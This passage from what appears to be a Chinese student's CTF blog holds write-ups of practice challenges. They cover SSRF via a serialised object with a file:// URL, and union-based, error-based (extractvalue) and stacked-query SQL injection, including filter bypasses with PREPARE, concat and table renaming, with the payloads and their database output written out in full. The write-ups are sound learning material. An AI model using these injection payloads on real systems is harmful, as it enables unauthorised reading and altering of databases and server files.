class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是验证注册时的字段用的</p>
<p>看了wp知道，这是考文件读取，用御剑可以扫到flag.php，读取不出来</p>
<p>get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。猜测可能flag.php处于内网，如果用ssrf访问flag.php，可以用伪协议file:&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php访问。注入时&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php刚才扫目录得知flag.php也在这个目录中，user()查权限，是root权限，可以读取flag</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4–+ 直接读取失败</p>
<p>查上面的data列，是个序列化后的UserInfo对象</p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,group_concat(no,data),3,4 from users#           看了wp才知道，Union报错是因为没把from写在后边</p>
<p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:10:&quot;orange.com&quot;;&#125;,2O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;root&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:12:&quot;bilibili.com&quot;;&#125;</code></p>
<p>反序列化还没学，以后补档</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’</p>
<p>data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tmMDcxMTU1OS02MmY4LTQ0YmItODljYi0wNjM1NTFlZmYwOTJ9IjsNCmV4aXQoMCk7DQo&#x3D;</p>
<p>base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&#123;f0711559-62f8-44bb-89cb-063551eff092&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlebao/p/14104036.html">https://www.cnblogs.com/junlebao/p/14104036.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/20240331%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-sql/" data-id="clyyhqmor00060ov508678tbc" data-title="20240331刷题日记-sql" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">ctf刷题日记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240330刷题日记-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/20240330%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-1/" class="article-date">
  <time class="dt-published" datetime="2024-03-30T09:40:31.000Z" itemprop="datePublished">2024-03-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">ctf刷题日记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/20240330%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-1/">20240330刷题日记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2024-3-30-主站刷题"><a href="#2024-3-30-主站刷题" class="headerlink" title="2024&#x2F;3&#x2F;30 主站刷题"></a>2024&#x2F;3&#x2F;30 主站刷题</h1><h2 id="1-ez-sql"><a href="#1-ez-sql" class="headerlink" title="1.ez_sql"></a>1.ez_sql</h2><p>1.测试注入类型<br>  回显 2-1不等于1，字符型</p>
<p>2.判断闭合方式</p>
<p>  1‘看报错，得知单引号闭合</p>
<p>3.查列数</p>
<p>group by得2列</p>
<p>4.union select查询</p>
<p>select被过滤，绕过方法也失效，采用报错注入</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27%7C%7Cextractvalue(1,concat(%27$%27,(database())))%7C%7C%271%27=%271">http://210.30.97.133:28043/?inject=1&#39;||extractvalue(1,concat(&#39;$&#39;,(database())))||&#39;1&#39;=&#39;1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : Unknown XPATH variable at: &#x27;$supersqli&#x27;</span><br></pre></td></tr></table></figure>

<p>拿表名</p>
<p>发现过滤了&#x3D;&#x3D;.&#x3D;&#x3D;号，还过滤了where，查资料发现可以堆叠注入</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> databases;#</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;`</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> tables;#</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>select被过滤</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> columns from words;# 没有flag</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28085/?inject=1%27;show">http://210.30.97.133:28085/?inject=1&#39;;show</a> columns from `1919810931114514`;# &#x3D;&#x3D;反单引号括住&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>?inject&#x3D;1’;select flag from flag;# 会过滤select，到这没思路去看<a href=https://blog.csdn.net/weixin_44632787/article/details/118737571>wp</a>了</p>
<p>方法一：MySQL中查询语句handler：</p>
<ol>
<li><code>handler 【表名】 open;</code> &#x2F;&#x2F; 打开某个表</li>
<li><code>handler 【表名】 read first || next;</code> &#x2F;&#x2F; 读取表里第一行或者下一行的数据</li>
<li><code>handler 【表名】 close;</code> &#x2F;&#x2F; 关闭该表</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler `1919810931114514` open;</span><br><span class="line">handler `1919810931114514` read first;</span><br><span class="line">handler `1919810931114514` close;</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<ol>
<li><code>PREPARE 【自定义名】 FROM 【自定义的SQL查询语句】;</code>&#x2F;&#x2F;生成</li>
<li><code>EXECUTE 【自定义名】;//执行</code></li>
<li><code>DEALLOCATE PREPARE 【自定义名】;</code>&#x2F;&#x2F;释放</li>
</ol>
<p>由于select被过滤，concat绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;</span><br></pre></td></tr></table></figure>

<p>或者ascii编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514`&#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;#</span><br></pre></td></tr></table></figure>

<p>方法三</p>
<p>由于前端提供查询的数据库为words，但是flag在数据库1919810931114514里。并且可以猜测后台的SQL查询语句为：select * from words where id&#x3D;【你输入的id】</p>
<p>1.所以我们需要先将数据库words改成其它的数据库名<br>2.再把数据库1919810931114514改名为words<br>3.并且把（改名前）1919810931114514数据库的字段flag改名成id</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table words rename to words1;</span><br><span class="line">alter table `1919810931114514` rename to words;</span><br><span class="line">alter table words change flag id varchar(100);</span><br></pre></td></tr></table></figure>

<p>改完之后输入?inject&#x3D;1’ or 1&#x3D;1;   显示flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;590b74d2-2d4d-41f7-bb0e-137622e5043b&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/118737571">https://blog.csdn.net/weixin_44632787/article/details/118737571</a></p>
</blockquote>
<h2 id="SSSCTF2023-YUAN’S-SQL"><a href="#SSSCTF2023-YUAN’S-SQL" class="headerlink" title="SSSCTF2023-YUAN’S SQL"></a>SSSCTF2023-YUAN’S SQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM jiuzhe WHERE id = &quot;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>提示：闭合方式是(id)</p>
<p>发现注释符好像没有用，手动闭合</p>
<p>&#x3D;&#x3D;?id&#x3D;1) or (1&#x3D;1&#x3D;&#x3D;  给了个fake flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [id] =&gt; 3 [username] =&gt; A306 [password] =&gt; where_is_flag ) [1] =&gt; Array ( [id] =&gt; 4 [username] =&gt; Fake_F1ag [password] =&gt; sssctf&#123;f11lag_is_not_there_hahaha&#125; ) )</span><br></pre></td></tr></table></figure>

<p>试了试id&#x3D;3，发现有回显，测试注入点</p>
<p>&#x3D;&#x3D;?id&#x3D;3)–+&#x3D;&#x3D;  Array ( [0] &#x3D;&gt; Array ( [id] &#x3D;&gt; 3 [username] &#x3D;&gt; A306 [password] &#x3D;&gt; where_is_flag ) )</p>
<p>?id&#x3D;3) group by 4–+无回显，3有回显，3列</p>
<p>?id&#x3D;3) union select 1,2,database()–+Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;dutctf&#x3D;&#x3D; ) </p>
<p>?id&#x3D;3) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dutctf’–+</p>
<p>查表</p>
<p> Array ( [id] &#x3D;&gt; 1[username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;jiuzhe,users&#x3D;&#x3D;) )</p>
<p>查列</p>
<p>?id&#x3D;3) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’dutctf’ and table_name&#x3D;’users’–+</p>
<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; id,&#x3D;&#x3D;username,password&#x3D;&#x3D; ) </p>
<p>查数据</p>
<p>?id&#x3D;3) union select 1,2,group_concat(username,password) from users–+</p>
<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; scr1wOHHHHHHH,Flag&#x3D;&#x3D;flag{c39ee9a1-5a6f-41c4-9789-909ab2d1ba1d}&#x3D;&#x3D; )</p>
<p>学过了再来复现新生赛，很有成就感╰(￣▽￣)╭</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/20240330%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-1/" data-id="clyyhqmoo00020ov5dmcq4e6j" data-title="20240330刷题日记" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">ctf刷题日记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DUTCTF2024-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/DUTCTF2024-wp/" class="article-date">
  <time class="dt-published" datetime="2024-03-24T13:01:09.000Z" itemprop="datePublished">2024-03-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctf-writeup/">ctf writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/DUTCTF2024-wp/">DUTCTF2024 wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PRTS-8-DUTCTF2024wp"><a href="#PRTS-8-DUTCTF2024wp" class="headerlink" title="PRTS-8- DUTCTF2024wp"></a>PRTS-8- DUTCTF2024wp</h1><h2 id="web-数据库初学者"><a href="#web-数据库初学者" class="headerlink" title="web-数据库初学者"></a>web-数据库初学者</h2><p>先试了试bp和hackbar发现post过去都是404，直接输入框注入</p>
<h3 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h3><p>输入1’ <img src="/../images/image-20240317213954350.png" alt="image-20240317213954350"></p>
<p>得知闭合方式是单引号</p>
<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><p>1’ group by 4,2,3… 确认列数为3</p>
<p><img src="/../images/image-20240317214642112.png" alt="image-20240317214642112"></p>
<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union select 1,2,3无回显，能报错，尝试extractvalue报错注入</p>
<h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><p>1’ union select 1,extractvalue(1,concat(0x7e,(select database()))),3#</p>
<p><img src="/../images/image-20240317214950549.png" alt="image-20240317214950549"></p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))),3#</p>
<p><img src="/../images/image-20240316140205455.png" alt="image-20240316140205455"></p>
<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))),3#</p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),31,30))),3#</p>
<p><img src="D:/1211185800/nt_qq/nt_data/Pic/2024-03/Ori/a74d30c7540bb5ed3891eded62973a88.png" alt="a74d30c7540bb5ed3891eded62973a88"></p>
<p><img src="/../images/image-20240317215252039.png" alt="image-20240317215252039"></p>
<h4 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h4><p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’SPRING_SESSION_A’))),3#</p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))),3#</p>
<p><img src="/../images/image-20240316141001206.png" alt="image-20240316141001206"></p>
<p><img src="/../images/image-20240316134732827.png" alt="image-20240316134732827"></p>
<h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(CREATION_TIME,’ ‘,EXPIRY_TIME,’ ‘,LAST_) from SPRING_SESSION ))),3#</p>
<p><img src="/../images/image-20240316135333630.png" alt="image-20240316135333630"></p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(CREATION_TIME,’ ‘,EXPIRY_TIME)  from SPRING_SESSION ))),3#</p>
<h5 id="1’-union-select-1-extractvalue-1-concat-0x7e-substring-select-group-concat-CREATION-TIME-’-‘-EXPIRY-TIME-from-SPRING-SESSION-1-30-3"><a href="#1’-union-select-1-extractvalue-1-concat-0x7e-substring-select-group-concat-CREATION-TIME-’-‘-EXPIRY-TIME-from-SPRING-SESSION-1-30-3" class="headerlink" title="1’ union select 1,extractvalue(1,concat(0x7e,substring((select group_concat(CREATION_TIME,’ ‘,EXPIRY_TIME)  from SPRING_SESSION),1,30))),3#"></a>1’ union select 1,extractvalue(1,concat(0x7e,substring((select group_concat(CREATION_TIME,’ ‘,EXPIRY_TIME)  from SPRING_SESSION),1,30))),3#</h5><p>1710567042349 1710571042700</p>
<p>试了试不对，才发现有user这张表</p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,(select group_concat(name,’ ‘,password) from users ))),3#</p>
<p><img src="/../images/image-20240316141127903.png" alt="image-20240316141127903"></p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,substr((select group_concat(name,’ ‘,password) from users),1,30) )),3#</p>
<p><img src="/../images/image-20240316141246770.png"></p>
<p>root 7cd1daa6-4099-439d-ae79-7</p>
<p>1’ union select 1,extractvalue(1,concat(0x7e,substr((select group_concat(name,’ ‘,password) from users),30,30) )),3#</p>
<p>7368ab6bd430</p>
<p>root 7cd1daa6-4099-439d-ae79-7368ab6bd430</p>
<p><img src="/../images/image-20240316141346452.png" alt="image-20240316141346452"></p>
<p>flag{no_env_debug} 发现是测试网站，没有真的flag</p>
<p><img src="/../images/image-20240316142236109.png" alt="image-20240316142236109"></p>
<p>062493c1-f612-495c-9097-17ec1a2e8832</p>
<p>dutctf{2f844dc2-ab0d-4a69-8ecf-69c87ff18c4d} </p>
<p><img src="/../images/image-20240316142326787.png" alt="image-20240316142326787"></p>
<h2 id="crypto-我真的不玩星穹铁道"><a href="#crypto-我真的不玩星穹铁道" class="headerlink" title="crypto-我真的不玩星穹铁道"></a>crypto-我真的不玩星穹铁道</h2><p>b站找视频，一个个对着打（崩坏文化博大精深</p>
<p>DUTCTF{ASIGNINPROBLEMINCRYPTO}</p>
<p><img src="/../images/image-20240316171643684.png" alt="image-20240316171643684"></p>
<h2 id="reverse-计算练习"><a href="#reverse-计算练习" class="headerlink" title="reverse-计算练习"></a>reverse-计算练习</h2><p>对re实在一窍不通，尝试用ce改，但是改了没啥用（</p>
<p>老老实实写个c++程序算</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> a, a1, b, b1, c;</span><br><span class="line">	<span class="keyword">while</span> (a != <span class="number">-1</span>) &#123;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; a1 &gt;&gt; b &gt;&gt; b1 &gt;&gt; c;</span><br><span class="line">		<span class="type">int</span> t1 = a / (a1 + <span class="number">1</span>);</span><br><span class="line">		<span class="type">int</span> t2 = b / (b1 + <span class="number">1</span>);</span><br><span class="line">		cout &lt;&lt; t1 &lt;&lt; <span class="string">&quot;x^&quot;</span> &lt;&lt; a1 + <span class="number">1</span> &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; t2 &lt;&lt; <span class="string">&quot;x^&quot;</span> &lt;&lt; b1 + <span class="number">1</span> &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c &lt;&lt; <span class="string">&quot;x^1&quot;</span> &lt;&lt; <span class="string">&quot;+c&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如图，硬算了50个</p>
<p><img src="/../images/image-20240317135051087.png"></p>
<p><img src="/../images/image-20240317135547097.png" alt="image-20240317135547097"></p>
<p>最后在小写l和大写I这废了点功夫</p>
<p>flag{m3th_Indefinite_integr@Is_are_1nteresting}</p>
<p>flag{m3th_Indefinite_integr@ls_are_1nteresting}   ai ai</p>
<p>flag{m3th_lndefinite_integr@ls_are_1nteresting}  ai el;   ai ai;   el ai ;el el bingo</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/DUTCTF2024-wp/" data-id="clyyhqmot000a0ov5a64mb7bx" data-title="DUTCTF2024 wp" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">ctf刷题日记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">ctf刷题日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">刷题日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf-wp/" style="font-size: 10px;">ctf wp</a> <a href="/tags/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="font-size: 15px;">ctf刷题日记</a> <a href="/tags/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="font-size: 10px;">刷题日记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 20px;">学习笔记</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">七月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">六月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">五月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">四月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/posts/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/posts/ssrf%E6%BC%8F%E6%B4%9E/">ssrf漏洞</a>
          </li>
        
          <li>
